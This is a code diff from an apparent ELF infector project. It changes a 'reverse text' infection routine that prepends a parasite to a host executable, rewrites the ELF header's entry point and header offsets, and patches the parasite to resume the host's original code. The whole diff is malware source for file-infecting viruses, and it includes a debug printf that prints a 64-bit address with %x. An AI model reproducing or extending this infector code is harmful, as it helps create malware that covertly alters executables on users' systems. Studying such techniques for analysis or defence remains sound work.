@@ -14,7 +14,7 @@ struct ElfReverseTextInfo {
 };
 
 // uint64_t next_32_bit_aligned_addr(uint64_t v) { return (v & (~0b11)) + 4; }
-uint64_t round_up_to_page(uint64_t v) { return (v & (~0b111111111111)) + 4096; }
+uint64_t round_up_to_page(uint64_t v) { return (v & ~(4096 - 1)) + 4096; }
 
 bool patch_sht(vt::common::Mmap<PROT_READ | PROT_WRITE>& output_mapping,
                size_t parasite_size, Elf64_Addr original_text_segment_vaddr) {
@@ -99,6 +99,7 @@ Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   if (header->e_type == ET_EXEC) {
     header->e_entry = info.original_code_segment_p_vaddr -
                       round_up_to_page(parasite_size) + sizeof(Elf64_Ehdr);
+    printf("entry %x\n", header->e_entry);
   } else if (header->e_type == ET_DYN) {
     header->e_entry = sizeof(Elf64_Ehdr);
   } else {
@@ -107,16 +108,7 @@ Elf64_Addr patch_ehdr(vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping,
   auto extra_space = round_up_to_page(parasite_size);
   header->e_shoff += extra_space;
   header->e_phoff += extra_space;
-  return original_entry_point + extra_space;
-}
-
-bool patch_parasite_and_resume_control(
-    Elf64_Addr original_entry_point, size_t parasite_size,
-    vt::common::Mmap<PROT_READ | PROT_WRITE>& host_mapping) {
-  auto header = reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
-  return patch_parasite_and_relinquish_control(
-      header->e_type, original_entry_point, sizeof(elf64_hdr),
-      sizeof(elf64_hdr), parasite_size, host_mapping);
+  return original_entry_point;
 }
 
 bool get_info(const char* host_mapping, uint64_t parasite_size,
@@ -170,7 +162,7 @@ bool reverse_text_infect64(
             info.original_code_segment_p_vaddr);
 
   // Patch elf header last
-  auto original_entry_point_shifted =
+  auto original_entry_point =
       patch_ehdr(host_mapping, info, parasite_mapping.size());
 
   // Shift host content back, starting from the end of ehdr to make room for
@@ -188,8 +180,9 @@ bool reverse_text_infect64(
          parasite_mapping.base(), parasite_mapping.size());
 
   // Patch parasite to resume host code after execution.
-  return patch_parasite_and_resume_control(
-      original_entry_point_shifted, parasite_mapping.size(), host_mapping);
+  return patch_parasite_and_relinquish_control(
+      host_header->e_type, original_entry_point, host_header->e_entry,
+      sizeof(elf64_hdr), parasite_mapping.size(), host_mapping);
 }
 
 size_t ReverseTextInfect::output_size(size_t host_size, size_t parasite_size) {
